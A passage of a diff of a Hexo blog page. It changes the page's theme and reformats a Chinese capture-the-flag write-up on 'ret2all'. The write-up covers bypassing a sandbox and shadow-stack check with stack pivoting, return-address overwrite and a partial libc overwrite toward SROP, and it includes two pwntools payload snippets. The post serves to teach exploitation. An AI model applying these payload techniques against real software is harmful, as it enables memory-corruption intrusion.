@@ -1,747 +1,989 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
-  <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <title>ret2all详细分析与总结 | heart22&#39;s blog</title>
-  
-  <!-- Favicon 配置 -->
-  
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
     
-      <link rel="icon" type="image/x-icon" href="../../../../favicon.ico">
+    <meta name="author" content="The Redefine Team">
     
-    
-      <link rel="icon" type="image/png" sizes="16x16" href="../../../../favicon-16x16.png">
-    
-    
-      <link rel="icon" type="image/png" sizes="32x32" href="../../../../favicon-32x32.png">
-    
-    
-      <link rel="icon" type="image/png" sizes="192x192" href="../../../../favicon-192x192.png">
-    
-    
-      <link rel="apple-touch-icon" sizes="180x180" href="../../../../apple-touch-icon.png">
-    
-  
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
-  <link rel="stylesheet" href="../../../../css/theme-colors.css">
-  <link rel="stylesheet" href="../../../../css/main.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
 
-  <!-- 添加代码高亮样式 -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
-  <!-- 添加highlight.js库 -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
-  <!-- 添加mermaid.js库 -->
-  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
-  <link rel="stylesheet" href="../../../../css/code.css">
-  <link rel="stylesheet" href="../../../../css/code-custom.css">
-  <link rel="stylesheet" href="../../../../css/code-languages.css">
-  <link rel="stylesheet" href="../../../../css/mermaid.css">
+                // Try immediately
+                if (addBodyClass()) return;
 
-  <link rel="stylesheet" href="../../../../css/vs-code.css">
-  <link rel="stylesheet" href="../../../../css/post.css">
-  <link rel="stylesheet" href="../../../../css/tag.css">
-  <link rel="stylesheet" href="../../../../css/categories.css">
-  <link rel="stylesheet" href="../../../../css/archive.css">
-  <link rel="stylesheet" href="../../../../css/search.css">
-  <link rel="stylesheet" href="../../../../css/mobile.css">  <link rel="stylesheet" href="../../../../css/responsive.css">
-  <link rel="stylesheet" href="../../../../css/elements.css">
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
-  <!-- 添加 JetBrains Mono 字体 -->  
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/11/03/ret2all详细分析与总结/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2all详细分析与总结">
+<meta property="og:url" content="http://example.com/2025/11/03/ret2all%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="heart22&#39;s blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-11-03T06:29:56.000Z">
+<meta property="article:modified_time" content="2025-11-03T06:31:26.440Z">
+<meta property="article:author" content="heart22">
+<meta property="article:tag" content="ret2all">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="../../../../images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="../../../../images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            ret2all详细分析与总结 | Theme Redefine
+        
+    </title>
 
-  <!-- Add any custom head content here -->
+    
+<link rel="stylesheet" href="fonts/Chillax/chillax.css">
 
-  <script src="../../../../js/explorer.js"></script>
-  <script src="../../../../js/code-copy.js"></script>
-  <script src="../../../../js/code-enhance.js"></script>
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/regular.min.css">
+
+    
+    
+    
+    
 <meta name="generator" content="Hexo 7.3.0"></head>
 
-  <body>
-    <div class="wrapper">
-      <div class="mobile-menu-toggle">
-        <i class="fas fa-bars"></i>
-      </div>
-      <header class="vs-header">
-  <nav class="vs-nav">
-    <div class="nav-left">
-      <a href="/" class="nav-brand">
-        <i class="fas fa-terminal"></i>
-        heart22&#39;s blog
-      </a>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Theme Redefine
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="../../../../index.html"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-    
-    <div class="nav-right">
-      <a href="/" class="nav-item ">
-        <i class="fas fa-home"></i>
-        <span>Home</span>
-      </a>
-      <a href="/archives/" class="nav-item ">
-        <i class="fas fa-archive"></i>
-        <span>Archives</span>
-      </a>
-      <a href="/categories/" class="nav-item ">
-        <i class="fas fa-folder"></i>
-        <span>Categories</span>
-      </a>
-      <a href="/tags/" class="nav-item ">
-        <i class="fas fa-tags"></i>
-        <span>Tags</span>
-      </a>
-      <a href="/search/" class="nav-item ">
-        <i class="fas fa-search"></i>
-        <span>Search</span>
-      </a>
-      <a href="/about/" class="nav-item ">
-        <i class="fas fa-info-circle"></i>
-        <span>About</span>
-      </a>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="../../../../index.html"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
     </div>
-  </nav>
+
+    <div class="window-mask"></div>
+
 </header>
 
-<script>
-  function smoothScroll(event, target) {
-    event.preventDefault();
-    const targetId = target.substring(target.indexOf('#') + 1);
-    const targetElement = document.getElementById(targetId);
 
-    if (targetElement) {
-      window.scrollTo({
-        top: targetElement.offsetTop - 50, // 调整偏移量
-        behavior: 'smooth'
-      });
-    } else {
-      window.location.href = target;
-    }
-  }
+		</div>
 
-  window.addEventListener('scroll', function() {
-    const header = document.querySelector('.vs-header');
-    const nav = document.querySelector('.vs-nav');
-    const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
-    
-    nav.style.setProperty('--scroll-percent', `${scrollPercent}%`);
-    
-    if (window.scrollY > 0) {
-      header.classList.add('scrolled');
-    } else {
-      header.classList.remove('scrolled');
-    }
-  });
+		<div class="main-content-body transition-fade-up">
+			
 
-  // 添加标签页切换动画
-  document.querySelectorAll('.nav-item').forEach(item => {
-    item.addEventListener('click', function(e) {
-      const ripple = document.createElement('span');
-      ripple.classList.add('nav-ripple');
-      this.appendChild(ripple);
-      
-      const rect = this.getBoundingClientRect();
-      const x = e.clientX - rect.left;
-      const y = e.clientY - rect.top;
-      
-      ripple.style.left = `${x}px`;
-      ripple.style.top = `${y}px`;
-      
-      setTimeout(() => ripple.remove(), 1000);
-    });
-  });
-</script>
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ret2all详细分析与总结</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="../../../../images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-11-03 14:29:56</span>
+        <span class="mobile">2025-11-03 14:29:56</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-11-03 14:31:26</span>
+            <span class="mobile">2025-11-03 14:31:26</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="../../../../categories/stack/">stack</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="../../../../tags/ret2all/">ret2all</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
 
 
-<div class="vscode-container">
-  <!-- 左侧资源管理器 -->
-  <div class="sidebar-explorer">
-    <!-- TOC导航 -->
-    <div class="explorer-section">
-      <div class="section-header">
-        <i class="fas fa-list"></i>
-        <span>TABLE OF CONTENTS</span>
-      </div>
-      <div class="section-content">
-        
-      </div>
-    </div>
-    
-    <!-- 同分类文章 -->
-    
-    <div class="explorer-section">
-      <div class="section-header">
-        <i class="fas fa-folder"></i>
-        <span>CATEGORY POSTS</span>
-      </div>
-      <div class="section-content">
-        
-      </div>
-    </div>
-    
-    
-    <!-- 标签列表 -->
-    
-    <div class="explorer-section">
-      <div class="section-header">
-        <i class="fas fa-tags"></i>
-        <span>ARTICLE TAGS</span>
-      </div>
-      <div class="section-content">
-        
-          <div class="tag-item">
-            <i class="fas fa-tag"></i>
-            <a href="../../../../tags/ret2all/">ret2all</a>
-            <span class="count">(1)</span>
-          </div>
-        
-      </div>
-    </div>
-    
-  </div>
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>最近高本版only_read的题目很多，不管是有输出还是无输出，各种形式下。ret2all都能中的各种方法都能起到作用，因此复现一下这个手法。感谢YX-hueimie师傅出的那么棒的题目，在复现中温故而知新了许多知识了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150305/2025/11/3e7cda0c4ac1fdc6be2ac8716bfcd850.png"
+                     
+                ><br>这里就是给了rread函数的返回地址和保存的旧的rbp的值，后面mprotect限制不能修改这个rbp的值。开启沙箱。关闭标准错误。</p>
+<p>沙箱的话<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150307/2025/11/e13675ebd04e02143d7a0f22dea3e249.png"
+                     
+                ><br>read和write的分支全禁，留下本体，read的第一个参数不能大于等于1，write的第一个参数只能等于2，但是后面又close(2)，需要dup2(1, 2)更改fd才能再调用write</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150309/2025/11/0ef24b47d780f1bc916cfc4691c5aa97.png"
+                     
+                ><br>vuln中的read存在栈溢出可以溢出0x28</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150310/2025/11/b5874f3e0f78d9607f53be1dfdada6ce.png"
+                     
+                ><br><code>shadow</code>函数限制了前0x60字节为<code>LOVE</code>中的内容，不能修改旧的rbp的值和ret的值<br>所有真正溢出的只有0x18</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP + <span class="hljs-number">0x10</span>,<br>    read_addr,<br>    RBP - <span class="hljs-number">0x10</span><br>)<br></code></pre></td></tr></table></figure></div>
 
-  <!-- 主要内容区域 -->
-  <div class="editor-content">
-    <div class="tab-bar">
-      <div class="tab active">
-        <i class="fas fa-file-alt"></i>
-        <span>ret2all详细分析与总结.md</span>
-      </div>
-    </div>
-    
-    <div class="content-area">
-      <article class="post-content">
-        <div class="post-header">
-          <h1>ret2all详细分析与总结</h1>
-          <div class="post-meta">
-            <span class="date">
-              <i class="fas fa-calendar-alt"></i>
-              2025-11-03
-            </span>            
-              <span class="categories">
-                <i class="fas fa-folder"></i>
-                <div class="categories-list">
-                  <ul class="category-item-post-list"><li class="category-item-post-list-item"><a class="category-item-post-list-link" href="../../../../categories/stack/">stack</a></li></ul>
-                </div>
-              </span>
-            
-            
-              <span class="tags">
-                <i class="fas fa-tags"></i>
-                <div class="tags-list">
-                  <ul class="tag-item-post-list" itemprop="keywords"><li class="tag-item-post-list-item"><a class="tag-item-post-list-link" href="../../../../tags/ret2all/" rel="tag">ret2all</a></li></ul>
-                </div>
-              </span>
-            
-          </div>
-        </div>
-        
-        <div class="post-body vscode-markdown">
-          <p>最近高本版only_read的题目很多，不管是有输出还是无输出，各种形式下。ret2all都能中的各种方法都能起到作用，因此复现一下这个手法。感谢YX-hueimie师傅出的那么棒的题目，在复现中温故而知新了许多知识了。</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150305/2025/11/3e7cda0c4ac1fdc6be2ac8716bfcd850.png"><br>这里就是给了rread函数的返回地址和保存的旧的rbp的值，后面mprotect限制不能修改这个rbp的值。开启沙箱。关闭标准错误。</p>
-<p>沙箱的话<br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150307/2025/11/e13675ebd04e02143d7a0f22dea3e249.png"><br>read和write的分支全禁，留下本体，read的第一个参数不能大于等于1，write的第一个参数只能等于2，但是后面又close(2)，需要dup2(1, 2)更改fd才能再调用write</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150309/2025/11/0ef24b47d780f1bc916cfc4691c5aa97.png"><br>vuln中的read存在栈溢出可以溢出0x28</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150310/2025/11/b5874f3e0f78d9607f53be1dfdada6ce.png"><br><code>shadow</code>函数限制了前0x60字节为<code>LOVE</code>中的内容，不能修改旧的rbp的值和ret的值<br>所有真正溢出的只有0x18</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP + <span class="hljs-number">0x10</span>,<br>    read_addr,<br>    RBP - <span class="hljs-number">0x10</span><br>)<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150312/2025/11/214611728f65a0a9a9c6e36eb9a67310.png"><br>溢出可以修改vuln中的旧的rbp的值</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150314/2025/11/a74a43292bc2b533bea417048639499d.png"></p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150315/2025/11/55fde9069af6cd40206c910090991dba.png"><br>vuln执行完leave_ret后返回main中还是执行leave_ret，这里联系的leave_ret可以造成栈迁移，因此我们刚刚的溢出，将vuln的rbp的值改成<code>0x7fffb01c6e70</code>,栈迁移后rip旧变成了<code>0x7fffb01c6e70 + 8 </code>即为<code>read_addr</code>,rbp中为<code>0x7fffb01c6e90</code></p>
-<p>控制了rbp就是控制了<code>read</code>的<code>rsi</code>,可以控制<code>read</code>读的地址<br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150316/2025/11/aa982b70089f89603b23e684cbf1a1d9.png"></p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150318/2025/11/de7f87cb397db814cade9e9cb36e4549.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150312/2025/11/214611728f65a0a9a9c6e36eb9a67310.png"
+                     
+                ><br>溢出可以修改vuln中的旧的rbp的值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150314/2025/11/a74a43292bc2b533bea417048639499d.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150315/2025/11/55fde9069af6cd40206c910090991dba.png"
+                     
+                ><br>vuln执行完leave_ret后返回main中还是执行leave_ret，这里联系的leave_ret可以造成栈迁移，因此我们刚刚的溢出，将vuln的rbp的值改成<code>0x7fffb01c6e70</code>,栈迁移后rip旧变成了<code>0x7fffb01c6e70 + 8 </code>即为<code>read_addr</code>,rbp中为<code>0x7fffb01c6e90</code></p>
+<p>控制了rbp就是控制了<code>read</code>的<code>rsi</code>,可以控制<code>read</code>读的地址<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150316/2025/11/aa982b70089f89603b23e684cbf1a1d9.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150318/2025/11/de7f87cb397db814cade9e9cb36e4549.png"
+                     
+                ></p>
 <p>构造好read,第二段读入</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = flat(<br>    p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read_addr,<br>    leave_ret,<br>    RBP+<span class="hljs-number">0x100</span>,<br>    leave_ret,<br>    RBP-<span class="hljs-number">0x18</span>,<br>    leave_ret,<br>    <span class="hljs-number">0</span>,<br>    p8(<span class="hljs-number">0xec</span>)<br>)<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = flat(<br>    p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read_addr,<br>    leave_ret,<br>    RBP+<span class="hljs-number">0x100</span>,<br>    leave_ret,<br>    RBP-<span class="hljs-number">0x18</span>,<br>    leave_ret,<br>    <span class="hljs-number">0</span>,<br>    p8(<span class="hljs-number">0xec</span>)<br>)<br></code></pre></td></tr></table></figure></div>
 
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150320/2025/11/398590a0f334ce96d3235776c0e6a455.png"></p>
-<p>这里涉及到几个点，首先是覆盖read的返回地址，达成栈返回。在调用read的时候会将返回地址压栈，我们可以修改这个返回地址达到劫持程序流但是可以不用经过<code>shadow</code>检测。<br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150322/2025/11/242232be60183797f697762aa845b174.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150320/2025/11/398590a0f334ce96d3235776c0e6a455.png"
+                     
+                ></p>
+<p>这里涉及到几个点，首先是覆盖read的返回地址，达成栈返回。在调用read的时候会将返回地址压栈，我们可以修改这个返回地址达到劫持程序流但是可以不用经过<code>shadow</code>检测。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150322/2025/11/242232be60183797f697762aa845b174.png"
+                     
+                ></p>
 <p>然后就是这里的<code>0x7ffd1ac556b8</code>这里的<code>mov edi, eax</code>是libc中的地址,是栈中常见的libc地址，距离这里附近有一个syscall,我们利用溢出将这个地址最后两位改成ec后变成syscall后方便后面srop的利用</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150324/2025/11/6cd912b9197628ee3ef43214567e300d.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
